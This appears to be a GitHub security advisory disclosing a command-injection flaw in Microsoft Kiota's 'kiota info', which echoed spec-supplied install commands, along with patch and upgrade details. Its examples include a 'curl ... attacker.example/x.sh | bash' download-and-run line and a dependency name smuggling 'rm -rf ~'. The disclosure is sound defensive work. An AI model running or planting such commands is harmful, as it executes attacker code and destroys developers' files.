# [C] Microsoft Kiota: Command injection via x-ms-kiota-info dependencyInstallCommand surfaced by `kiota info`

## Summary
Severity: Critical
Advisory: GHSA-hq9q-27g5-qwpj
CVE: CVE-2026-59865
CWE: CWE-829, CWE-94
Ecosystem: NuGet
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-hq9q-27g5-qwpj
Type: github-advisory

## Affected
- NuGet: `Microsoft.OpenApi.Kiota` — affected >=1.30.0 <1.32.5
- NuGet: `Microsoft.OpenApi.Kiota.Builder` — affected >=1.30.0 <1.32.5
- NuGet: `Microsoft.OpenApi.Kiota` — affected >=0 <1.29.1
- NuGet: `Microsoft.OpenApi.Kiota.Builder` — affected >=0 <1.29.1

## Details
### Summary

`kiota info` — the command developers run to learn which packages to install after generating a client —
read the `x-ms-kiota-info` extension from the OpenAPI description and presented the spec-supplied
`dependencyInstallCommand` (and dependency `name`/`version`) **as the tool's own recommended install
command**, replacing kiota's normally-trusted suggestion. With an attacker-controlled or compromised
description:

```
$ kiota info -d <attacker-spec> -l CSharp
   ...
   Hint: use the install command to install the dependencies.
   Example:
      curl -s https://attacker.example/x.sh | bash   # attacker-controlled
```

A developer who followed kiota's explicit instruction (run the suggested install command) executed
attacker-controlled shell — **command injection → RCE**. The IDE-facing `kiota info --json` output, which the
Kiota **VS Code extension** consumes to offer/run dependency installation, exposed the raw command string
directly, so an "install dependencies" action in the IDE could run it automatically.

Confirmed on Kiota **1.32.4**.

### Details

`x-ms-kiota-info.languagesInformation.<language>.dependencyInstallCommand` was emitted verbatim as the
install-command example, and `dependencies[].name`/`version` were shown verbatim in the package table:

```
# spec
x-ms-kiota-info:
  languagesInformation:
    CSharp:
      dependencyInstallCommand: "curl -s https://attacker.example/x.sh | bash"
      dependencies: [{ name: "Evil.Pkg; rm -rf ~", version: "1.0.0", type: bundle }]
```

Without `x-ms-kiota-info`, kiota suggests its own trusted command (e.g.
`dotnet add package Microsoft.Kiota.Authentication.Azure --version 2.0.0`); the spec's value **replaced** it.
`kiota info --json` (consumed by the Kiota VS Code extension) emitted the attacker command in
`dependencyInstallCommand`.

### Impact

A developer who ran `kiota info` on an attacker-controlled or compromised OpenAPI description and followed
kiota's instruction to run the suggested install command executed arbitrary shell on their workstation or CI
host. The Kiota VS Code extension, which surfaced/ran `dependencyInstallCommand` from the `--json` output,
could make this automatic. CWE-94 / CWE-829.

Precondition: the description is from an untrusted source (or a trusted one that was tampered with), and the
recommended command is run (manually per kiota's hint, or by the IDE).

### Patches

Fixed in **1.29.1 and 1.32.5** (https://github.com/microsoft/kiota/pull/7883). Support for the spec-supplied
`dependencyInstallCommand` in `x-ms-kiota-info` was **removed** entirely: `kiota info` no longer reads or
presents a description-provided install command and only surfaces kiota's own built-in, package-manager
templates. The `--json` output no longer carries a spec-controlled command string for the IDE to run.

### Remediation

Upgrade to Kiota **1.29.1, 1.32.5,** or later. Update the Kiota VS Code extension to a version built against 1.32.5+.

## References
- https://github.com/microsoft/kiota/security/advisories/GHSA-hq9q-27g5-qwpj
- https://nvd.nist.gov/vuln/detail/CVE-2026-59865
- https://github.com/microsoft/kiota/pull/7883
- https://github.com/microsoft/kiota/commit/e1d6d76c6eecbe50785429166faaf8c831e036c6
- https://github.com/microsoft/kiota
- https://github.com/microsoft/kiota/releases/tag/v1.32.5
